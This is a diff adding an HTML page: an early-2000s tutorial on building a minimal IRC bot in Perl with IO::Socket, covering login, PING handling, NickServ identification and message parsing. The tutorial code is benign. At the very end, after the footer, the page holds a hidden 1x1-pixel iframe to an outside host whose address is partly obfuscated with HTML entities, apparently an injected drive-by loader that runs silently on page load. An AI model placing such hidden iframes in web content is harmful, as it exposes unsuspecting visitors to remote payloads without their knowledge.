@@ -1,0 +1,388 @@
+<html>
+
+<head>
+<title>Bare Bones IRC Bot In Perl - by b0iler</title>
+</head>
+
+<body bgcolor="black">
+<font color="white">
+
+<h1>Bare Bones IRC Bot In Perl.</h1>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; by b0iler : <br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b0iler@hotmail.com : last update July 26th 2002<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Written for :<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a href="http://b0iler.eyeonsecurity.net">http://b0iler.eyeonsecurity.net</a> - my site full of other cool tutorials<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a href="http://blacksun.box.sk">http://blacksun.box.sk</a> - a legendary site full of original tutorials
+
+<br><br><br>
+
+This is a short guide to creating your own perl bot which will work on irc.  I will not 
+cover all the different modules and ways to connect to irc and issue commands.  This 
+will only cover connecting with IO::Socket and using raw irc commands.  I feel you learn 
+the most this way and have alot of control over what is happening.
+
+<br><br>
+
+IRC experience is helpful, but I'll take things slow enough so that an absolute beginner 
+can understand what is taking place.  This will also help those with alittle knowledge 
+fully understand the irc protocol.  Although I am no irc expert, after creating this 
+bot I did learn a few tricks.
+
+<br><br>
+
+We start off by getting a connection underway:
+
+<br><pre>
+
+#!/usr/bin/perl
+use IO::Socket;
+
+$sock = IO::Socket::INET->new(
+	PeerAddr => 'irc.undernet.org', 
+	PeerPort => 6667, 
+	Proto => 'tcp' ) or die "could not make the connection";
+</pre><br>
+
+You can use any irc server and any port (commonly used ports are 6667-7000), so long 
+as they are valid.  If you have problems try to find a different server on that 
+network.  To make things easier you can make the PeerAddr a variable which is 
+specified by an argument from the command line.  Or purhaps map out all the servers 
+on the network and make an arry from them, connecting to random ones and using the 
+best connection.  There are many possibilities, each work best for certain 
+situations.  We'll stick to the simple hard coded address and port.
+
+<br><br>
+
+Now we have a connection to the server.  We still need to get connected/logged in to 
+the ircd.  Anything we send to or recieve from the server will go through $sock.  So 
+lets see what the server is sending us after we make a connection.
+
+<br><pre>
+
+while($line = &lt;$sock>){
+	print "$line\n";
+}
+</pre><br>
+
+We will see that the server prints out some lines.  Each line will have a number 
+representation to it.  This will really help to tell the bot when to start and end 
+routines.  The key here is the line with 'NOTICE AUTH' in it.  This is when we need 
+to login to the irc server.  To do this we send 
+
+<br><br>
+
+NICK bots_nick<br>
+USER bots_ident 0 0 :bots name
+
+<br><br>
+
+With a line break after the bots_nick and a line break at the end.  So in the while loop 
+we will add something like this:
+
+<br><pre>
+
+while($line = &lt;$sock>){
+	print $line;
+	if($line =~ /(NOTICE AUTH).*(checking ident)/i){
+		print $sock "NICK b0ilersbot\nUSER bot 0 0 :just a bot\n";
+		last;
+	}
+}
+</pre><br>
+
+Now we are done with the login process.  If you are having any problems try to read up 
+on the irc protocol and how to login to it with telnet.  Raven from www.securitywriters.org 
+has wrote a decent tutorial on the subject, look for it.
+
+<br><br>
+
+Some servers will ask for a ping to make sure the client is active.  This is only done 
+on some servers and is a common pitfall to many bots which don't support this kind of 
+login proceedure.  To handle this we will check if the server wants us to ping it.  
+The server will ask for a ping before it asks about nickserv registration/identification, 
+so we will stop this loop after it mentions nickserv.  This is what those numbers in 
+the last if statment are for, the 376|422.  The way to identify to nickserv is like this
+
+<br><br>
+
+NICKSERV :identify nick_password
+
+<br><br>
+
+this is just a simple irc command.  The command is 'NICKSERV' and the arguments are 
+'identify nick_password' where nick_password is the actual password for this nick.  The 
+line ends in a line break and all irc commands are in upper case.  When there is a : 
+before something it means it is a multiple word argument (has spaces in it).  This is 
+how we will handle the possible ping and the nickserv identification.
+
+<br><pre>
+
+while($line = &lt;$sock>){
+	print $line;    
+	#use next line if the server asks for a ping
+	if($line =~ /^PING/){
+		print $sock "PONG :" . (split(/ :/, $line))[1];
+	}
+	if($line =~ /(376|422)/i){
+		print $sock "NICKSERV :identify nick_password\n";
+		last;
+	}
+}
+</pre><br>
+
+If you want to have a registration code you can find this out on your own.. or do what I 
+do and register the nick with a normal irc client.  This way we only need the bot to 
+identify.
+
+<br><br>
+
+When you create your bot you can customize it however you want.  Most of my bots have 
+alittle bit more AI then this tutorial shows.  This bot will be pretty strait forword 
+and doesn't make many decisions.  It just connects and does something.
+
+<br><br>
+
+I like to make the bot sleep for a few seconds just to get the connection cought up.  
+I am on a 56k and things can go slow sometimes.  A few times without the sleep the bot 
+has joined channels before the nickserv identification is complete, this can be a pain 
+in the neck if the bot needs a usermode or other circumstances which require the nick 
+to be identified (such as other bots, +R channel mode, or trust issues with users).
+
+<br><br>
+
+After it sleeps it will join the channel.  You will see that the server prints out alot 
+of information about the channel when you join.  You can save this information in 
+variables to allow the bot to make many decisions.  Again, this is a simple bot and 
+won't be aware of it's environment or be dynamic in anyway.  But you could for example 
+turn on/off colors by what channel modes are set or who is in the channel (some people 
+really hate colors).  This is the last bit of the login proccess, after this the bot 
+can actually do something.
+
+<br><pre>
+
+sleep 3;
+print $sock "JOIN #channel\n";
+</pre><br>
+
+Notice there is no : before #channel.  This is because it does not have any spaces in it.  
+And the JOIN command is in all caps.  For a full list of commands try reading a tutorial 
+on the IRC protocol.  I don't even cover the basics here, there are tons of useful to know 
+commands.
+
+<br><br>
+
+Now we are joining the channel.  There is nothing else to do besides read the messages 
+users send to the channel and respond to them.  But inorder to read the messages we need 
+to parse them so they make sense.  The format of a priv_msg is as follows:
+
+<br><br>
+
+:nick!ident@hostname.com PRIVMSG #channel :the line of text
+
+<br><br>
+
+I like to seperate them into the following variables to make things easier to keep track of.  
+
+<br><br>
+
+:$nick!$hostname $type $channel :$text
+
+<br><br>
+
+in this example here is the values of the variables:
+
+<br><br>
+
+$nick = nick<br>
+$hostname = ident<br>
+$type = priv_msg<br>
+$channel = #channel<br>
+$text = the line of text
+
+<br><br>
+
+So we are going to need to parse what is send from the server into useable data.  This is 
+how we'll do it.  There is only one twist here, and that is incase the server sends a 
+ping.  They do this quite often to check and see if you are still connected.  If we don't 
+reply the the pings then we will get disconnected.  When the server sends a ping you 
+must reply with a PONG and the same characters the ping had.  So this is how we will send it
+
+<br><pre>
+
+while ($line = &lt;$sock>) {
+	($command, $text) = split(/ :/, $line);   #$text is the stuff from the ping or the text from the server
+	
+	if ($command eq 'PING'){
+		#while there is a line break - many different ways to do this
+		while ( (index($text,"\r") >= 0) || (index($text,"\n") >= 0) ){ chop($text); }
+		print $sock "PONG $text\n";
+		next;
+	}
+	#done with ping handling
+	
+	($nick,$type,$channel) = split(/ /, $line); #split by spaces
+	
+	($nick,$hostname) = split(/!/, $nick); #split by ! to get nick and hostname seperate
+	
+	$nick =~ s/://; #remove :'s
+	$text =~ s/://;
+	
+	#get rid of all line breaks.  Again, many different way of doing this.
+	$/ = "\r\n";
+	while($text =~ m#$/$#){ chomp($text); }
+        
+	#end of parsing, now for actions
+}
+</pre><br>
+
+ok.  That was a rather large chunk of code and some parts were rather confusing.  Most of 
+it is just getting rid of what we don't want and seperating what we do want into variables.
+The next bit is just for looks.  We print out what is said as if this is a normal irc client.  
+
+<br><pre>
+
+if($channel eq '#channel'){
+	print "&lt;$nick> $text";
+}
+</pre><br>
+
+The $channel check is needed incase people priv_msg or notice you things.  This can be a 
+problem when dealing with bots which need to be secure or can cause large headaches when 
+things go wrong.  I'll leave dealing with multiple channels to you.  But to send Notices 
+you simply do:  print $sock "NOTICE nick :the line of text here\n";  and to send a 
+priv_msg you do:  print $sock "PRIVMSG nick :the line of text here\n"; 
+
+<br><br>
+
+Now the bot structure is done.  Everything required is done, the only thing left to do 
+is custimize your bot to have it do what you want it to do.  This can be almost any sort 
+of task imaginable.  Simply parse the $text $nick and other variables we created to 
+have the bot make decisions on what to do.
+
+<br><br>
+
+Here is the final bot in whole.  I added one bit just to prove that the bot works:
+
+<br><pre>
+#!/usr/bin/perl
+use IO::Socket;
+
+$sock = IO::Socket::INET->new(
+	PeerAddr => 'irc.undernet.org', 
+	PeerPort => 6667, 
+	Proto => 'tcp' ) or die "could not make the connection";
+	
+while($line = &lt;$sock>){
+	print $line;
+	if($line =~ /(NOTICE AUTH).*(checking ident)/i){
+		print $sock "NICK b0ilersbot\nUSER bot 0 0 :just a bot\n";
+		last;
+	}
+}
+
+while($line = &lt;$sock>){
+	print $line;    
+	#use next line if the server asks for a ping
+	if($line =~ /^PING/){
+		print $sock "PONG :" . (split(/ :/, $line))[1];
+	}
+	if($line =~ /(376|422)/i){
+		print $sock "NICKSERV :identify nick_password\n";
+		last;
+	}
+}
+
+sleep 3;
+print $sock "JOIN #channel\n";
+
+while ($line = &lt;$sock>) {
+	($command, $text) = split(/ :/, $line);   #$text is the stuff from the ping or the text from the server
+	
+	if ($command eq 'PING'){
+		#while there is a line break - many different ways to do this
+		while ( (index($text,"\r") >= 0) || (index($text,"\n") >= 0) ){ chop($text); }
+		print $sock "PONG $text\n";
+		next;
+	}
+	#done with ping handling
+	
+	($nick,$type,$channel) = split(/ /, $line); #split by spaces
+	
+	($nick,$hostname) = split(/!/, $nick); #split by ! to get nick and hostname seperate
+	
+	$nick =~ s/://; #remove :'s
+	$text =~ s/://;
+	
+	#get rid of all line breaks.  Again, many different way of doing this.
+	$/ = "\r\n";
+	while($text =~ m#$/$#){ chomp($text); }
+	
+	if($channel eq '#channel'){
+		print "&lt;$nick> $text";
+		
+		if($text =~ /hi b0ilerbot/gi){
+			print $sock "PRIVMSG #channel :hi $nick\n";
+		}
+	}
+}
+</pre><br>
+
+Not very complicated once you look at each part of it.  But finding out things for yourself 
+is the real fun of creating a bot.  Much trial and error is involved in perfecting the bot, 
+adding security and function can be alot of fun.  I would like to stress the security of irc bots.  
+They are in the most hostile environment known to the net and one security mistake and your 
+bot could be used to execute commands on your box.  I have found 4 irc perl bots vulnerable 
+to remote command execution, don't let me find yours vulnerable aswell!  Read all of the perl 
+security related tutorials at <a href="http://b0iler.eyeonsecurity.net/tutorials/">http://b0iler.eyeonsecurity.net/tutorials/</a> 
+Don't let this discurage you from coding your own bot, it's a great learning experience and as long as you 
+are careful you should be fairly safe.  I would love to hear what kind of bots you come up with.  The bots
+I have created include:
+
+<br><br>
+
+<b>quote bot</b>&nbsp; -&nbsp; a bot which has many features that deal with irc quotes.  it reads off funny/witty things 
+people have said while chatting in my channels.  It also has some more advanced features such as listing 
+off all the users in the channel who have a quote and an admin feature which allows me to add quotes while 
+the bot is running.
+
+<br><br>
+
+<b>quiz bot</b>&nbsp; -&nbsp; A bot which quizes the channel users.  I used this while studying for networking.  This bot is 
+great when the channel is dead or to start up a conversation with others.  I learned alot from this bot.
+
+<br><br>
+
+<b>poker bot</b>&nbsp; -&nbsp; A bot which plays poker.  I started to make a ucker (sp?) bot, but I lost motivation when the 
+other people who wantted to play quit going on irc.
+
+<br><br>
+
+<b>channel bot</b>&nbsp; -&nbsp; A bot which enforces the channel rules.  it warns, kicks, and kick bans users for breaking the 
+rules.  it voices,half ops, and ops identified users and keeps stats of channel activity.  Good for preventing 
+channel takeovers.
+
+<br><br>
+
+The reason for creating this text was because I remember the stress I had finding info on this subject when 
+I first created the bot.  I have since read a few crappy papers on irc bots, but nothing which would be very 
+helpful.
+
+<br><br>
+
+<b>[-----]</b><br><br>
+
+<a href="http://b0iler.eyeonsecurity.net">http://b0iler.eyeonsecurity.net</a>&nbsp; - is my homepage.&nbsp;  - Come and check out the message board some friends and I have started, many great disscussions to be had there.&nbsp; <a href="http://rawt.daemon.sh/wwwboard/">http://rawt.daemon.sh/wwwboard/</a>
+
+<br><br>
+
+I got tons of tutorials, mini-tutorials, advisories, and code written by me there.&nbsp; Come check out what I'm up to and possibly 
+learn a bit.
+
+<br><br>
+
+<b>[-----]</b>
+
+<br><br><br><br>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
